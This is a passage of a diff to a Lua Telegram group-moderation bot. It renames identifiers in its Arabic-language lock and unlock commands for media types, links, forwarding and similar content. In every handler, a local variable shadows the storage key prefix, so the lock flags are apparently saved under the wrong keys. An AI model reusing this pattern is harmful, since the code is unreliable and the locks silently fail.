+flashdx1:setex(flash..'bot:muteall'..msg.chat_id_, num, true)
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم قفل الكل لمده "..mutept[1].." ساعه ،", 'md')
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_momod(msg.sender_user_id_, msg.chat_id_) then
-if text and text:match("^قفل (.*)$") and FLASH11(msg) then
+if text and text:match("^قفل (.*)$") and flash11(msg) then
 if is_leaderid(msg.sender_user_id_) then
 tar = 'المطور 🌟'
 elseif is_sudoid(msg.sender_user_id_) then
@@ -7536,216 +7536,216 @@ tar = 'الادمن 🥈'
 end
 local mutepts = {string.match(text, "^(قفل) (.*)$")}
 if mutepts[2] == "الدردشه" then
-if not FLASHdx1:get(FLASH..'bot:text:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الدردشه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'bot:text:mute'..msg.chat_id_,true)
+if not flashdx1:get(flash..'bot:text:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الدردشه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'bot:text:mute'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الدردشه سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الدردشه سابقا ،', 1, 'md')
 end end
 if mutepts[2] == "الاونلاين" then
-if not FLASHdx1:get(FLASH..'bot:inline:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الاونلاين  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 57, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'bot:inline:mute'..msg.chat_id_,true)
+if not flashdx1:get(flash..'bot:inline:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الاونلاين  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 57, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'bot:inline:mute'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الاونلاين سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الاونلاين سابقا ،', 1, 'md')
 end end
 if mutepts[2] == "الصور" then
-if not FLASHdx1:get(FLASH..'bot:photo:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الصور  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 53, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'bot:photo:mute'..msg.chat_id_,true)
+if not flashdx1:get(flash..'bot:photo:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الصور  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 53, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'bot:photo:mute'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الصور سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الصور سابقا ،', 1, 'md')
 end end
 if mutepts[2] == "الكلايش" then
-if not FLASHdx1:get(FLASH..'bot:spam:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الكلايش  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'bot:spam:mute'..msg.chat_id_,true)
+if not flashdx1:get(flash..'bot:spam:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الكلايش  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'bot:spam:mute'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الكلايش سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الكلايش سابقا ،', 1, 'md')
 end end
 if mutepts[2] == "الفيديو" then
-if not FLASHdx1:get(FLASH..'bot:video:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الفيديو  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'bot:video:mute'..msg.chat_id_,true)
+if not flashdx1:get(flash..'bot:video:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الفيديو  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'bot:video:mute'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الفيديو سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الفيديو سابقا ،', 1, 'md')
 end end
 if mutepts[2] == "المتحركه" then
-if not FLASHdx1:get(FLASH..'bot:gifs:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » المتحركه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 56, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'bot:gifs:mute'..msg.chat_id_,true)
+if not flashdx1:get(flash..'bot:gifs:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » المتحركه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 56, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'bot:gifs:mute'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » المتحركه سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » المتحركه سابقا ،', 1, 'md')
 end end
 if mutepts[2] == "الاغاني" then
-if not FLASHdx1:get(FLASH..'bot:music:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الاغاني  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'bot:music:mute'..msg.chat_id_,true)
+if not flashdx1:get(flash..'bot:music:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الاغاني  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'bot:music:mute'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الاغاني سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الاغاني سابقا ،', 1, 'md')
 end end
 if mutepts[2] == "الصوت" then
-if not FLASHdx1:get(FLASH..'bot:voice:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الصوت  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 53, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'bot:voice:mute'..msg.chat_id_,true)
+if not flashdx1:get(flash..'bot:voice:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الصوت  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 53, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'bot:voice:mute'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الصوت سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الصوت سابقا ،', 1, 'md')
 end end
 if mutepts[2] == "الروابط" then
-if not FLASHdx1:get(FLASH..'bot:links:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الروابط  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'bot:links:mute'..msg.chat_id_,true)
+if not flashdx1:get(flash..'bot:links:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الروابط  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'bot:links:mute'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الروابط سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الروابط سابقا ،', 1, 'md')
 end end
 if mutepts[2] == "المواقع" then
-if not FLASHdx1:get(FLASH..'bot:location:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » المواقع  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'bot:location:mute'..msg.chat_id_,true)
+if not flashdx1:get(flash..'bot:location:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » المواقع  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'bot:location:mute'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » المواقع سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » المواقع سابقا ،', 1, 'md')
 end end
 if mutepts[2] == "المعرف" then
-if not FLASHdx1:get(FLASH..'tags:lock'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » المعرف  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 51, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'tags:lock'..msg.chat_id_,true)
+if not flashdx1:get(flash..'tags:lock'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » المعرف  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 51, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'tags:lock'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » المعرف سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » المعرف سابقا ،', 1, 'md')
 end end
 if mutepts[2] == "الدخول" then
-if not FLASHdx1:get(FLASH..'Lock:Join'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الدخول  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 54, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'Lock:Join'..msg.chat_id_,true)
+if not flashdx1:get(flash..'Lock:Join'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الدخول  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 54, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'Lock:Join'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الدخول سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الدخول سابقا ،', 1, 'md')
 end end
 if  mutepts[2] == "الحمايه" then
-if not FLASHdx1:get(FLASH..'bot:strict'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الحمايه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'bot:strict'..msg.chat_id_,true)
+if not flashdx1:get(flash..'bot:strict'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الحمايه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'bot:strict'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الحمايه سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الحمايه سابقا ،', 1, 'md')
 end end
 if mutepts[2] == "الملفات" then
-if not FLASHdx1:get(FLASH..'bot:document:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الملفات  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'bot:document:mute'..msg.chat_id_,true)
+if not flashdx1:get(flash..'bot:document:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الملفات  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'bot:document:mute'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الملفات سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الملفات سابقا ،', 1, 'md')
 end end
 if mutepts[2] == "الهاشتاك" then
-if not FLASHdx1:get(FLASH..'bot:hashtag:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الهاشتاك  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 56, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'bot:hashtag:mute'..msg.chat_id_,true)
+if not flashdx1:get(flash..'bot:hashtag:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الهاشتاك  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 56, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'bot:hashtag:mute'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الهاشتاك سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الهاشتاك سابقا ،', 1, 'md')
 end end
 if mutepts[2] == "الجهات" then
-if not FLASHdx1:get(FLASH..'bot:contact:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الجهات  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 54, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'bot:contact:mute'..msg.chat_id_,true)
+if not flashdx1:get(flash..'bot:contact:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الجهات  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 54, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'bot:contact:mute'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الجهات سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الجهات سابقا ،', 1, 'md')
 end end
 if mutepts[2] == "الشبكات" then
-if not FLASHdx1:get(FLASH..'bot:webpage:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الشبكات  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'bot:webpage:mute'..msg.chat_id_,true)
+if not flashdx1:get(flash..'bot:webpage:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الشبكات  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'bot:webpage:mute'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الشبكات سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الشبكات سابقا ،', 1, 'md')
 end end
 if mutepts[2] == "العربيه" then
-if not FLASHdx1:get(FLASH..'bot:arabic:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » العربيه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'bot:arabic:mute'..msg.chat_id_,true)
+if not flashdx1:get(flash..'bot:arabic:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » العربيه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'bot:arabic:mute'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » العربيه سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » العربيه سابقا ،', 1, 'md')
 end end
 if mutepts[2] == "الانكليزيه" then
-if not FLASHdx1:get(FLASH..'bot:english:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الانكليزيه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 58, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'bot:english:mute'..msg.chat_id_,true)
+if not flashdx1:get(flash..'bot:english:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الانكليزيه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 58, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'bot:english:mute'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الانكليزيه سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الانكليزيه سابقا ،', 1, 'md')
 end end
 if mutepts[2] == "الملصقات" then
-if not FLASHdx1:get(FLASH..'bot:sticker:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الملصقات  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 56, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'bot:sticker:mute'..msg.chat_id_,true)
+if not flashdx1:get(flash..'bot:sticker:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الملصقات  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 56, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'bot:sticker:mute'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الملصقات سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الملصقات سابقا ،', 1, 'md')
 end end
 if mutepts[2] == "الماركداون" then
-if not FLASHdx1:get(FLASH..'markdown:lock'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الماركداون  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 58, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'markdown:lock'..msg.chat_id_,true)
+if not flashdx1:get(flash..'markdown:lock'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الماركداون  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 58, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'markdown:lock'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الماركداون سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الماركداون سابقا ،', 1, 'md')
 end end
 if mutepts[2] == "الاشعارات" then
-if not FLASHdx1:get(FLASH..'bot:tgservice:jk'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الاشعارات  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 57, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'bot:tgservice:jk'..msg.chat_id_,true)
+if not flashdx1:get(flash..'bot:tgservice:jk'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الاشعارات  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 57, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'bot:tgservice:jk'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الاشعارات سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الاشعارات سابقا ،', 1, 'md')
 end end
 if mutepts[2] == "الفشار" then
-if not FLASHdx1:get(FLASH.."fshar"..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الفشار  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 54, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH.."fshar"..msg.chat_id_,true)
+if not flashdx1:get(flash.."fshar"..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الفشار  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 54, string.len(msg.sender_user_id_))
+flashdx1:set(flash.."fshar"..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الفشار سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الفشار سابقا ،', 1, 'md')
 end end
 if mutepts[2] == "الطائفيه" then
-if not FLASHdx1:get(FLASH.."taf"..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الطائفيه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 56, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH.."taf"..msg.chat_id_,true)
+if not flashdx1:get(flash.."taf"..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الطائفيه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 56, string.len(msg.sender_user_id_))
+flashdx1:set(flash.."taf"..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الطائفيه سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الطائفيه سابقا ،', 1, 'md')
 end end
 if mutepts[2] == "الكفران" then
-if not FLASHdx1:get(FLASH.."kaf"..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الكفران  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH.."kaf"..msg.chat_id_,true)
+if not flashdx1:get(flash.."kaf"..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » الكفران  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:set(flash.."kaf"..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الكفران سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » الكفران سابقا ،', 1, 'md')
 end end
 if mutepts[2] == "التوجيه" then
-if not FLASHdx1:get(FLASH..'bot:forward:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » التوجيه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:set(FLASH..'bot:forward:mute'..msg.chat_id_,true)
+if not flashdx1:get(flash..'bot:forward:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » التوجيه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'bot:forward:mute'..msg.chat_id_,true)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » التوجيه سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم قفل » التوجيه سابقا ،', 1, 'md')
 end end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_momod(msg.sender_user_id_, msg.chat_id_) then
-if text and text:match("^فتح (.*)$") and FLASH11(msg) then
+if text and text:match("^فتح (.*)$") and flash11(msg) then
 if is_leaderid(msg.sender_user_id_) then
 tar = 'المطور 🌟'
 elseif is_sudoid(msg.sender_user_id_) then
@@ -7767,214 +7767,214 @@ tar = 'الادمن 🥈'
 end
 local unmutepts = {string.match(text, "^(فتح) (.*)$")}
 if unmutepts[2] == "الدردشه" then
-if FLASHdx1:get(FLASH..'bot:text:mute'..msg.chat_id_) then 
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الدردشه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:text:mute'..msg.chat_id_)
+if flashdx1:get(flash..'bot:text:mute'..msg.chat_id_) then 
